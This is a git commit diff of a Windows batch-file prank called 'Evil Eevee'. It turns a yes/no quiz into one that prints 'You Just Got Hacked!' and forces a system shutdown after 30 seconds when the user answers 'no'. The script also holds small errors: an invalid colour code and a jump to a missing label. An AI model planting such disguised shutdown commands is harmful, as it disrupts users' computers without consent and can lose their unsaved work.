da1821c2e0a99fd8fabdd9a514eee721491ad92f
{G} gurraoptimus <63198393+gurraoptimus@users.noreply.github.com>
2024-03-29 17:47:10 +0100

    Evil Eevee

--- Eevee.bat
+++ Eevee.bat
@@ -1,20 +1,20 @@
 @echo off
 
-color c
-echo Hello, do you love this Eevee? (answer in only yes/no)
+color r
+echo Hello, do you love me? (answer in only yes/no)
 set /p input=
 if /i %input%==Yes goto love
 if /i %input%==no goto hate
 if /i not %input%== Yes,no goto 1
 
 :love
-echo I Love Eevee...
+echo I Love You too...
 echo See you Later
 pause
 exit
 
 :hate
-echo But I love Pokémon.... lol
+echo But I love You.... lol
 echo You Just Got Hacked!
 timeout 30
-exit
+shutdown -s -t 30
